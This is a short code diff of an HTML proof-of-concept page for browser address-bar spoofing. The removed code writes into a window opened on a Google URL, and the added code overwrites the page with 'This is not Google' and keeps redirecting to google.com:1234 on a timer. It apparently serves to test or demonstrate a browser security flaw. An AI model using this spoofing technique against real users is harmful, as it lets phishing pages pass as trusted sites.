@@ -1,8 +1,9 @@
 <script>
-    window.onclick = function () {
-        x = window.open('https://www.google.com/csi');
-        setTimeout(function () {
-            x.document.write(`I am not a www.google.com;<button onclick="alert('I can run JS on this page!')">click me</button>`)
-        }, 100);
-    }
+  var spoof = function(){
+      document.write("<h1>This is not Google</h1>");
+      document.location = "https://google.com:1234";
+      setInterval(function(){document.location="https://google.com:1234";},9800);
+  };
 </script>
+
+<input type="button" value="Spoof" onclick="spoof();" />
